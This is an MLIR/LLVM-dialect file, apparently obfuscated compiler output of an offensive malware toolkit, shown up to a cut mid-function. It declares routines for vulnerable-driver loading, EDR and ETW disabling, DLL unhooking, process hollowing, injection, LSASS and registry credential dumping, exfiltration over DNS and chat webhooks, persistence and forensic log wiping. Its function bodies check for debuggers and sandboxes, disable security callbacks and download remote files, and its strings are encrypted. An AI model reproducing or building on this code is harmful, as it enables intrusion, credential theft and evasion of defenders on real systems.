  llvm.func @memset(!llvm.ptr, i32, i64) -> !llvm.ptr
  llvm.func @memcpy(!llvm.ptr, !llvm.ptr, i64) -> !llvm.ptr
  llvm.func @strlen(!llvm.ptr) -> i64
  llvm.func @exit(i32)
  llvm.func @array_len(!llvm.ptr) -> i64
  llvm.func @array_append(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_alloc(i64) -> !llvm.ptr
  llvm.func @jocky_free(!llvm.ptr)
  llvm.func @jocky_byovd_new() -> !llvm.ptr
  llvm.func @jocky_byovd_destroy(!llvm.ptr)
  llvm.func @jocky_runtime_init() -> i32
  llvm.func @jocky_check_analysis_environment() -> i32
  llvm.func @jocky_is_debugger_present() -> i1
  llvm.func @jocky_is_vm() -> i1
  llvm.func @jocky_is_sandbox() -> i1
  llvm.func @jocky_sleep_and_recheck()
  llvm.func @jocky_decrypt_xor(!llvm.ptr, i32, i8, i32)
  llvm.func @jocky_decrypt_rc4(!llvm.ptr, i32, !llvm.ptr, i32)
  llvm.func @jocky_unhook_ntdll() -> i1
  llvm.func @jocky_unhook_kernel32() -> i1
  llvm.func @jocky_enable_direct_syscalls() -> i1
  llvm.func @jocky_disable_ob_callbacks() -> i1
  llvm.func @jocky_disable_minifilter_callbacks() -> i1
  llvm.func @jocky_disable_wdfilter() -> i1
  llvm.func @jocky_patch_etw_provider() -> i1
  llvm.func @jocky_spoof_process_name(!llvm.ptr) -> i1
  llvm.func @jocky_hide_from_usermode() -> i1
  llvm.func @jocky_disable_etw(!llvm.ptr) -> i1
  llvm.func @jocky_disable_edr_callbacks(!llvm.ptr) -> i32
  llvm.func @jocky_spoof_call(!llvm.ptr, i64, i64, i64, i64) -> i64
  llvm.func @jocky_spoof_syscall(i32, i64, i64, i64, i64) -> i64
  llvm.func @jocky_byovd_load(!llvm.ptr, !llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_byovd_unload(!llvm.ptr)
  llvm.func @jocky_driver_read_phys(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_driver_write_phys(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_driver_map_kernel(!llvm.ptr, i64, i32) -> !llvm.ptr
  llvm.func @jocky_elevate_token(!llvm.ptr, i32) -> i1
  llvm.func @jocky_process_hollow(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_rdll_inject(i32, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_encrypt(!llvm.ptr, i32, !llvm.ptr, i32)
  llvm.func @jocky_exfil_front(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_dns(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_discord(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_telegram(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_github(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_self_delete()
  llvm.func @jocky_clear_logs()
  llvm.func @jocky_wipe_artifacts(!llvm.ptr)
  llvm.func @jocky_wipe_prefetch()
  llvm.func @jocky_patch_shimcache() -> i1
  llvm.func @jocky_patch_amcache() -> i1
  llvm.func @jocky_clear_srum() -> i1
  llvm.func @jocky_cleanup_all()
  llvm.func @forensics_wipe_powershell_history() -> i32
  llvm.func @forensics_wipe_cmd_history() -> i32
  llvm.func @forensics_flush_arp_cache() -> i32
  llvm.func @forensics_clear_dns_cache() -> i32
  llvm.func @jocky_cleanup_event_logs(!llvm.ptr) -> i32
  llvm.func @jocky_cleanup_usn_journal() -> i32
  llvm.func @fs_exists(!llvm.ptr) -> i1
  llvm.func @fs_list_files(!llvm.ptr, i1) -> !llvm.ptr
  llvm.func @fs_file_size(!llvm.ptr) -> i64
  llvm.func @fs_read_file(!llvm.ptr) -> !llvm.ptr
  llvm.func @fs_write_file(!llvm.ptr, !llvm.ptr, i64) -> i1
  llvm.func @crypto_generate_key(i32) -> !llvm.ptr
  llvm.func @crypto_aes256_encrypt(!llvm.ptr, i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @crypto_aes256_decrypt(!llvm.ptr, i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @sandbox_spawn(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @sandbox_set_limits(i32, i64, i32, i64) -> i1
  llvm.func @sandbox_monitor(i32) -> i32
  llvm.func @sandbox_wait(i32) -> i32
  llvm.func @sandbox_export_trace(i32, !llvm.ptr) -> i1
  llvm.func @jocky_registry_create_key(i32, !llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_registry_set_value(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32, i32) -> i1
  llvm.func @jocky_registry_close_key(!llvm.ptr) -> i1
  llvm.func @audit_log(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr)
  llvm.func @audit_init(i32) -> i1
  llvm.func @audit_export(!llvm.ptr) -> i1
  llvm.func @audit_verify() -> i32
  llvm.func @provenance_record(!llvm.ptr, !llvm.ptr, !llvm.ptr)
  llvm.func @ai_init() -> i32
  llvm.func @ai_collect_telemetry() -> !llvm.ptr
  llvm.func @ai_score_threat() -> f64
  llvm.func @byovd_load_driver(!llvm.ptr) -> i32
  llvm.func @byovd_test_exploit(i32) -> i32
  llvm.func @btr_disable_notifications() -> i1
  llvm.func @btr_mask_module(!llvm.ptr) -> i1
  llvm.func @jocky_exploit_disable_callbacks() -> i32
  llvm.func @jocky_exploit_token_replacement(i32, i32) -> i32
  llvm.func @edrhoker_detect() -> i1
  llvm.func @blindside_unhook_ntdll() -> i1
  llvm.func @exfil_dns_tunnel(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @exfil_discord_webhook(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @exfil_local_cdn(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> i32
  llvm.func @jocky_http_get(!llvm.ptr, !llvm.ptr, i64) -> i64
  llvm.func @jocky_http_post(!llvm.ptr, !llvm.ptr, i32, !llvm.ptr) -> i1
  llvm.func @jocky_download_file(!llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_compress_data(!llvm.ptr, i32) -> !llvm.ptr
  llvm.func @jocky_decompress_data(!llvm.ptr, i32) -> !llvm.ptr
  llvm.func @jocky_registry_enum_keys(i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_registry_enum_values(i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_registry_get_value(i32, !llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_registry_dump_sam() -> i32
  llvm.func @jocky_registry_dump_security() -> i32
  llvm.func @jocky_registry_dump_lsa_secrets() -> i32
  llvm.func @jocky_registry_delete_key(i32, !llvm.ptr) -> i1
  llvm.func @jocky_wipe_jumplist() -> i1
  llvm.func @jocky_wipe_thumbcache() -> i1
  llvm.func @jocky_clear_recent_files() -> i1
  llvm.func @jocky_clear_mft_timestamps() -> i1
  llvm.func @jocky_wipe_free_space() -> i1
  llvm.func @jocky_wipe_temp_files(!llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_clear_browser_cache(!llvm.ptr) -> i1
  llvm.func @jocky_clear_browser_history(!llvm.ptr) -> i1
  llvm.func @jocky_cron_install(!llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_systemd_install(!llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_cron_remove(!llvm.ptr) -> i1
  llvm.func @jocky_systemd_remove(!llvm.ptr) -> i1
  llvm.func @jocky_linux_cleanup_audit() -> i32
  llvm.func @jocky_linux_cleanup_wtmp() -> i32
  llvm.func @jocky_linux_cleanup_lastlog() -> i32
  llvm.func @jocky_thread_get_info(i32) -> !llvm.ptr
  llvm.func @jocky_module_info(!llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_lsass_dump() -> i32
  llvm.func @jocky_credentials_enumerate() -> !llvm.ptr
  llvm.func @jocky_token_enumerate() -> !llvm.ptr
  llvm.func @jocky_impersonate_user(!llvm.ptr, !llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_data_base64_encode(!llvm.ptr, i32) -> !llvm.ptr
  llvm.func @jocky_data_base64_decode(!llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_data_hex_encode(!llvm.ptr, i32) -> !llvm.ptr
  llvm.func @jocky_data_hex_decode(!llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_ai_init() -> i1
  llvm.func @jocky_ai_get_threat_level() -> i32
  llvm.func @jocky_driver_score_composite(!llvm.ptr) -> i32
  llvm.func @jocky_driver_select_best(i32) -> !llvm.ptr
  llvm.func @jocky_driver_get_fallback_chain(i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_edr_profiler_init() -> !llvm.ptr
  llvm.func @jocky_edr_profiler_record_callback(!llvm.ptr)
  llvm.func @jocky_edr_profiler_analyze(!llvm.ptr) -> i32
  llvm.func @jocky_edr_get_syscall_delay(i32) -> i32
  llvm.func @jocky_edr_should_reduce_syscalls(i32) -> i1
  llvm.func @jocky_edr_should_batch_operations(i32) -> i1
  llvm.func @jocky_edr_profiler_shutdown(!llvm.ptr)
  llvm.func @f_42fc974f80dc() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.0.enc" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.2.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.3.enc" : !llvm.ptr
    %5 = llvm.mlir.zero : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.5.enc" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.6.enc" : !llvm.ptr
    %8 = llvm.mlir.constant(true) : i1
    %9 = llvm.mlir.addressof @edr_disabled : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.7.enc" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.8.enc" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.9.enc" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.10.enc" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.11.enc" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.12.enc" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.13.enc" : !llvm.ptr
    %17 = llvm.mlir.addressof @".str.14.enc" : !llvm.ptr
    %18 = llvm.mlir.addressof @".str.15.enc" : !llvm.ptr
    %19 = llvm.mlir.addressof @".str.16.enc" : !llvm.ptr
    %20 = llvm.mlir.addressof @".str.17.enc" : !llvm.ptr
    %21 = llvm.mlir.addressof @".str.18.enc" : !llvm.ptr
    %22 = llvm.mlir.addressof @".str.4.enc" : !llvm.ptr
    %23 = llvm.mlir.constant(false) : i1
    %24 = llvm.mlir.addressof @".str.1.enc" : !llvm.ptr
    %25 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %26 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %27 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %28 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %29 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %30 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %31 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %32 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %33 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %34 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %35 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<50 x i8>
    llvm.call @__obfs_wrap_println(%35) : (!llvm.ptr) -> ()
    %36 = llvm.call @__obfs_wrap_jocky_is_debugger_present() : () -> i1
    llvm.cond_br %36, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %37 = llvm.getelementptr %24[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @__obfs_wrap_println(%37) : (!llvm.ptr) -> ()
    llvm.return %23 : i1
  ^bb2:  // pred: ^bb0
    %38 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
    llvm.call @__obfs_wrap_println(%38) : (!llvm.ptr) -> ()
    %39 = llvm.call @__obfs_wrap_jocky_is_vm() : () -> i1
    llvm.cond_br %39, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %40 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<41 x i8>
    llvm.call @__obfs_wrap_println(%40) : (!llvm.ptr) -> ()
    llvm.call @__obfs_wrap_jocky_sleep_and_recheck() : () -> ()
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    %41 = llvm.call @__obfs_wrap_jocky_is_sandbox() : () -> i1
    llvm.cond_br %41, ^bb5, ^bb6
  ^bb5:  // pred: ^bb4
    %42 = llvm.getelementptr %22[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
    llvm.call @__obfs_wrap_println(%42) : (!llvm.ptr) -> ()
    llvm.return %23 : i1
  ^bb6:  // pred: ^bb4
    %43 = llvm.call @__obfs_wrap_jocky_disable_etw(%5) : (!llvm.ptr) -> i1
    llvm.store %43, %25 {alignment = 1 : i64} : i1, !llvm.ptr
    %44 = llvm.load %25 {alignment = 1 : i64} : !llvm.ptr -> i1
    llvm.cond_br %44, ^bb7, ^bb8
  ^bb7:  // pred: ^bb6
    %45 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<21 x i8>
    llvm.call @__obfs_wrap_println(%45) : (!llvm.ptr) -> ()
    llvm.br ^bb8
  ^bb8:  // 2 preds: ^bb6, ^bb7
    %46 = llvm.call @__obfs_wrap_jocky_disable_edr_callbacks(%5) : (!llvm.ptr) -> i32
    %47 = llvm.icmp "ne" %46, %2 : i32
    llvm.cond_br %47, ^bb9, ^bb10
  ^bb9:  // pred: ^bb8
    %48 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @__obfs_wrap_println(%48) : (!llvm.ptr) -> ()
    llvm.store %8, %9 {alignment = 1 : i64} : i1, !llvm.ptr
    llvm.br ^bb10
  ^bb10:  // 2 preds: ^bb8, ^bb9
    %49 = llvm.call @__obfs_wrap_jocky_disable_ob_callbacks() : () -> i1
    llvm.store %49, %26 {alignment = 1 : i64} : i1, !llvm.ptr
    %50 = llvm.load %26 {alignment = 1 : i64} : !llvm.ptr -> i1
    llvm.cond_br %50, ^bb11, ^bb12
  ^bb11:  // pred: ^bb10
    %51 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
    llvm.call @__obfs_wrap_println(%51) : (!llvm.ptr) -> ()
    llvm.br ^bb12
  ^bb12:  // 2 preds: ^bb10, ^bb11
    %52 = llvm.call @__obfs_wrap_jocky_disable_minifilter_callbacks() : () -> i1
    llvm.store %52, %27 {alignment = 1 : i64} : i1, !llvm.ptr
    %53 = llvm.load %27 {alignment = 1 : i64} : !llvm.ptr -> i1
    llvm.cond_br %53, ^bb13, ^bb14
  ^bb13:  // pred: ^bb12
    %54 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<38 x i8>
    llvm.call @__obfs_wrap_println(%54) : (!llvm.ptr) -> ()
    llvm.br ^bb14
  ^bb14:  // 2 preds: ^bb12, ^bb13
    %55 = llvm.call @__obfs_wrap_jocky_disable_wdfilter() : () -> i1
    llvm.store %55, %28 {alignment = 1 : i64} : i1, !llvm.ptr
    %56 = llvm.load %28 {alignment = 1 : i64} : !llvm.ptr -> i1
    llvm.cond_br %56, ^bb15, ^bb16
  ^bb15:  // pred: ^bb14
    %57 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<41 x i8>
    llvm.call @__obfs_wrap_println(%57) : (!llvm.ptr) -> ()
    llvm.br ^bb16
  ^bb16:  // 2 preds: ^bb14, ^bb15
    %58 = llvm.call @__obfs_wrap_jocky_unhook_ntdll() : () -> i1
    llvm.store %58, %29 {alignment = 1 : i64} : i1, !llvm.ptr
    %59 = llvm.load %29 {alignment = 1 : i64} : !llvm.ptr -> i1
    llvm.cond_br %59, ^bb17, ^bb18
  ^bb17:  // pred: ^bb16
    %60 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<23 x i8>
    llvm.call @__obfs_wrap_println(%60) : (!llvm.ptr) -> ()
    llvm.br ^bb18
  ^bb18:  // 2 preds: ^bb16, ^bb17
    %61 = llvm.call @__obfs_wrap_jocky_unhook_kernel32() : () -> i1
    llvm.store %61, %30 {alignment = 1 : i64} : i1, !llvm.ptr
    %62 = llvm.load %30 {alignment = 1 : i64} : !llvm.ptr -> i1
    llvm.cond_br %62, ^bb19, ^bb20
  ^bb19:  // pred: ^bb18
    %63 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    llvm.call @__obfs_wrap_println(%63) : (!llvm.ptr) -> ()
    llvm.br ^bb20
  ^bb20:  // 2 preds: ^bb18, ^bb19
    %64 = llvm.call @__obfs_wrap_jocky_enable_direct_syscalls() : () -> i1
    llvm.store %64, %31 {alignment = 1 : i64} : i1, !llvm.ptr
    %65 = llvm.load %31 {alignment = 1 : i64} : !llvm.ptr -> i1
    llvm.cond_br %65, ^bb21, ^bb22
  ^bb21:  // pred: ^bb20
    %66 = llvm.getelementptr %15[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<32 x i8>
    llvm.call @__obfs_wrap_println(%66) : (!llvm.ptr) -> ()
    llvm.br ^bb22
  ^bb22:  // 2 preds: ^bb20, ^bb21
    %67 = llvm.call @__obfs_wrap_jocky_patch_etw_provider() : () -> i1
    llvm.store %67, %32 {alignment = 1 : i64} : i1, !llvm.ptr
    %68 = llvm.load %32 {alignment = 1 : i64} : !llvm.ptr -> i1
    llvm.cond_br %68, ^bb23, ^bb24
  ^bb23:  // pred: ^bb22
    %69 = llvm.getelementptr %16[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @__obfs_wrap_println(%69) : (!llvm.ptr) -> ()
    llvm.br ^bb24
  ^bb24:  // 2 preds: ^bb22, ^bb23
    %70 = llvm.getelementptr %17[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %71 = llvm.call @__obfs_wrap_jocky_spoof_process_name(%70) : (!llvm.ptr) -> i1
    llvm.store %71, %33 {alignment = 1 : i64} : i1, !llvm.ptr
    %72 = llvm.load %33 {alignment = 1 : i64} : !llvm.ptr -> i1
    llvm.cond_br %72, ^bb25, ^bb26
  ^bb25:  // pred: ^bb24
    %73 = llvm.getelementptr %18[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @__obfs_wrap_println(%73) : (!llvm.ptr) -> ()
    llvm.br ^bb26
  ^bb26:  // 2 preds: ^bb24, ^bb25
    %74 = llvm.call @__obfs_wrap_jocky_hide_from_usermode() : () -> i1
    llvm.store %74, %34 {alignment = 1 : i64} : i1, !llvm.ptr
    %75 = llvm.load %34 {alignment = 1 : i64} : !llvm.ptr -> i1
    llvm.cond_br %75, ^bb27, ^bb28
  ^bb27:  // pred: ^bb26
    %76 = llvm.getelementptr %19[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
    llvm.call @__obfs_wrap_println(%76) : (!llvm.ptr) -> ()
    llvm.br ^bb28
  ^bb28:  // 2 preds: ^bb26, ^bb27
    %77 = llvm.getelementptr %20[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<40 x i8>
    llvm.call @__obfs_wrap_println(%77) : (!llvm.ptr) -> ()
    %78 = llvm.getelementptr %21[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @__obfs_wrap_println(%78) : (!llvm.ptr) -> ()
    llvm.return %8 : i1
  }
  llvm.func @f_40b5962dd677() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.19.enc" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.constant(4096 : i32) : i32
    %4 = llvm.mlir.addressof @".str.20.enc" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.22.enc" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.23.enc" : !llvm.ptr
    %7 = llvm.mlir.addressof @g_7bfb2ead : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.24.enc" : !llvm.ptr
    %9 = llvm.mlir.addressof @g_743afcdf : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.18.enc" : !llvm.ptr
    %11 = llvm.mlir.constant(true) : i1
    %12 = llvm.mlir.addressof @".str.21.enc" : !llvm.ptr
    %13 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %14 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %15 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    llvm.call @__obfs_wrap_println(%15) : (!llvm.ptr) -> ()
    %16 = llvm.sext %3 : i32 to i64
    %17 = llvm.call @__obfs_wrap_malloc(%16) : (i64) -> !llvm.ptr
    llvm.store %17, %13 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %18 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<33 x i8>
    %19 = llvm.load %13 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %20 = llvm.sext %3 : i32 to i64
    %21 = llvm.call @__obfs_wrap_jocky_http_get(%18, %19, %20) : (!llvm.ptr, !llvm.ptr, i64) -> i64
    llvm.store %21, %14 {alignment = 8 : i64} : i64, !llvm.ptr
    %22 = llvm.load %14 {alignment = 8 : i64} : !llvm.ptr -> i64
    %23 = llvm.sext %2 : i32 to i64
    %24 = llvm.icmp "sgt" %22, %23 : i64
    llvm.cond_br %24, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %25 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @__obfs_wrap_println(%25) : (!llvm.ptr) -> ()
    llvm.return %11 : i1
  ^bb2:  // pred: ^bb0
    %26 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @__obfs_wrap_println(%26) : (!llvm.ptr) -> ()
    %27 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.store %27, %7 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %28 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.store %28, %9 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %29 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @__obfs_wrap_println(%29) : (!llvm.ptr) -> ()
    %30 = llvm.load %13 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.call @__obfs_wrap_free(%30) : (!llvm.ptr) -> ()
    llvm.return %11 : i1
  }
  llvm.func @f_59bf8ee0007f() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.25.enc" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.18.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.28.enc" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.29.enc" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.30.enc" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.31.enc" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.33.enc" : !llvm.ptr
    %9 = llvm.mlir.constant(false) : i1
    %10 = llvm.mlir.addressof @".str.32.enc" : !llvm.ptr
    %11 = llvm.mlir.constant(true) : i1
    %12 = llvm.mlir.addressof @".str.26.enc" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.27.enc" : !llvm.ptr
    %14 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %15 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %16 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<38 x i8>
    llvm.call @__obfs_wrap_println(%16) : (!llvm.ptr) -> ()
    %17 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %18 = llvm.call @__obfs_wrap_fs_exists(%17) : (!llvm.ptr) -> i1
    llvm.cond_br %18, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %19 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %20 = llvm.call @__obfs_wrap_fs_file_size(%19) : (!llvm.ptr) -> i64
    llvm.store %20, %14 {alignment = 8 : i64} : i64, !llvm.ptr
    %21 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<23 x i8>
    %22 = llvm.load %14 {alignment = 8 : i64} : !llvm.ptr -> i64
    %23 = llvm.call @__obfs_wrap_string(%22) : (i64) -> !llvm.ptr
    %24 = llvm.call @__obfs_wrap_jocky_str_concat(%21, %23) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %25 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %26 = llvm.call @__obfs_wrap_jocky_str_concat(%24, %25) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @__obfs_wrap_println(%26) : (!llvm.ptr) -> ()
    llvm.return %11 : i1
  ^bb2:  // pred: ^bb0
    %27 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<32 x i8>
    %28 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %29 = llvm.call @__obfs_wrap_jocky_str_concat(%27, %28) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @__obfs_wrap_println(%29) : (!llvm.ptr) -> ()
    %30 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %31 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<2 x i8>
    %32 = llvm.call @__obfs_wrap_jocky_str_concat(%30, %31) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %33 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    %34 = llvm.call @__obfs_wrap_jocky_str_concat(%32, %33) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %34, %15 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %35 = llvm.load %15 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %36 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %37 = llvm.call @__obfs_wrap_jocky_download_file(%35, %36) : (!llvm.ptr, !llvm.ptr) -> i1
    llvm.cond_br %37, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %38 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %39 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %40 = llvm.call @__obfs_wrap_jocky_str_concat(%38, %39) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @__obfs_wrap_println(%40) : (!llvm.ptr) -> ()
    llvm.return %11 : i1
  ^bb4:  // pred: ^bb2
    %41 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
    llvm.call @__obfs_wrap_println(%41) : (!llvm.ptr) -> ()
    %42 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @__obfs_wrap_println(%42) : (!llvm.ptr) -> ()
    llvm.return %9 : i1
  }
  llvm.func @f_81f4df11aecf() -> i1 {
